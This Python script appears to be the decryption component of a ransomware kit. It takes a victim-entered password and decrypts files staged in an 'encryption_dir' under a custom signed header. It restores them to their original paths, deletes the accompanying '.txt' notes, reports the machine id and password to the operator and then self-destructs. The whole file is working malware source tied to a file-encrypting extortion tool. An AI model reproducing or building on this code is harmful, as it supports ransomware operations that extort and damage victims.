import binascii
import io
import os
import shutil
import sys
from struct import *
from sys import exit
import faulthandler
import pyAesCrypt
from crawler import config
from crawler_config import *
from helpers import get_computer_uid, uprint, deb, self_destroy, load_config, config, set_priority

key = None
bufferSize = 64 * 1024 * 8
password = "sdfsdfgsffsd"


def dir_files(int_path):
    """
    Function that receives as a parameter a directory path
    :return list_: File List and Its Absolute Paths
    """
    current_files = []
    total_files = 0
    for r, d, f in os.walk(int_path):
        for current_file in f:
            total_files += 1
            current_files.append(os.path.join(r, current_file))

    lst = [internal_file for internal_file in current_files]
    return lst


# Press the red button
if __name__ == '__main__':
    load_config()

    if not config.has_section('core'):
        deb(f'no config file')
        sys.exit(-1)

    encryption_dir = config['core'].get(
        'encryption_dir', fallback=r'c:\temp\edata')
    deb(f'encryption_dir: {encryption_dir}')

    if not os.path.isdir(encryption_dir):
        deb(f'no encdir')
        sys.exit(-1)

    computer_id = get_computer_uid()
    deb(f"your computer id: {computer_id}")

    files = dir_files(encryption_dir)
    if len(files) <= 0:
        deb('no files encrypted')
        exit(-1)

    deb(f'{len(files)} files in encrypted stage.')
    password = input('enter your decryption password: ')
    deb(f'password: {password}')
    ok = 0

    uprint(
        f"{computer_id}: decryption executed with password: {password}, {len(files)} files")

    set_priority(increase=True)

    for file in files:
        deb(f'processing {file}')
        done_file = False
        try:
            with open(file, 'rb') as r:
                try:
                    header = r.read(calcsize(Config.HEADER))
                    if len(header) != calcsize(Config.HEADER):
                        deb("not our file")
                        ok += 1
                        continue
                    sign, version, crc32, file_size, path = unpack(
                        Config.HEADER, header)
                    if sign != Config.SIGN:
                        deb(f"not our file2 {sign}/{Config.SIGN}")
                        continue
                    path = bytes(path).decode('utf-8')
                    path = path[0:path.find("\x00")]
                    filename = os.path.basename(path)
                    deb(f"ver={version} crc32={crc32} size={file_size} path={path}")

                    data = r.read()
                    deb(f"read {len(data)} bytes, inhdrsize={file_size} hdrsize={calcsize(Config.HEADER)}")
                    deb(f"reading {file} ... ", end="")
                    fCiph = io.BytesIO(data)
                    fDec = io.BytesIO()

                    ctlen = len(fCiph.getvalue())
                    fCiph.seek(0)

                    try:
                        deb(" decrypting ... ", end="")
                        pyAesCrypt.decryptStream(
                            fCiph, fDec, password, bufferSize, ctlen)
                    except BaseException as e:
                        deb(f"decrypting: {e}")
                        continue

                    decrypted_data = fDec.getvalue()
                    crc = binascii.crc32(decrypted_data)

                    if crc != crc32:
                        deb(f'CRC ERROR ', end='')
                    else:
                        deb(f'CRC OK ', end='')

                    decrypted_file = encryption_dir + str("\\") + str(filename)
                    with open(decrypted_file, "wb") as w:
                        try:
                            wrote = w.write(decrypted_data)
                            deb(f"{wrote} intermediate bytes OK\r\nwriting to {path}")
                            shutil.copyfile(decrypted_file, path)
                            ok += 1
                            done_file = True
                        except BaseException as e:
                            deb(f"exception write/copy: {e}")

                except BaseException as e:
                    deb(f"open {file} exception: {e}")

            if done_file:
                try:
                    if os.path.isfile(file):
                        os.unlink(file)
                    if os.path.isfile(decrypted_file):
                        os.unlink(decrypted_file)
                    if os.path.isfile(path + ".txt"):
                        os.unlink(path + ".txt")
                except Exception as e:
                    deb(f'unlink: {e}')

        except Exception as e:
            deb(f'processing({file}): {e}')

    uprint(f"{computer_id}: {ok}/{len(files)} files decrypted OK and moved to their source folders")

    if ok == len(files):
        self_destroy()
    else:
        deb(f'not all files decrypted, assuming desync and one more run')

    deb(f'planned exit')
